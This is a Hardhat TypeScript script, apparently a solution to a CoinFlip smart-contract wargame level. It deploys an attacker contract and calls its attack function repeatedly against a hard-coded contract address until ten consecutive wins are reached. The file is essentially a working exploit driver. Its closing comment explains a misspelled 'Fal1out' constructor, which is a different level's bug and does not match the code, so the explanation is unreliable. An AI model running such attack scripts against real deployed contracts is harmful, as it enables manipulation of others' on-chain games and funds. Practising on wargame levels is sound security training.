import { BigNumber, Contract } from "ethers";
import { ethers } from "hardhat";
import { deployContract } from "../../utils/deployContract";
import { abi } from "../../artifacts/contracts/CoinFlip/CoinFlip.sol/CoinFlip.json";

function setTargetContract() {
  const contractAddress = "0x865c9500404e1BBAa7ce5C51986c7ea39503301C";
  return new Contract(contractAddress, abi);
}

async function main() {
  const [attacker] = await ethers.getSigners();
  const CoinFlipAttack = await deployContract("CoinFlipAttacker", attacker);
  const CoinFlipTarget = setTargetContract();
  let consecutiveWin = BigNumber.from(0);
  console.log("Attack starts");
  for (let i = 0; i < 11; i++) {
    const pendingTx = await CoinFlipAttack.attack();
    await pendingTx.wait();
    consecutiveWin = await CoinFlipTarget.connect(attacker).consecutiveWins();
    console.log("Consecutive wins", consecutiveWin);
  }
  console.log("Success: ", consecutiveWin.gte(10));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

/* Explanation :
In previous version of solidity, the constructor was named after the name of 
the contract. Here Fal1out is mispelled, thus it is a regular public function,
callable by anyone.
*/
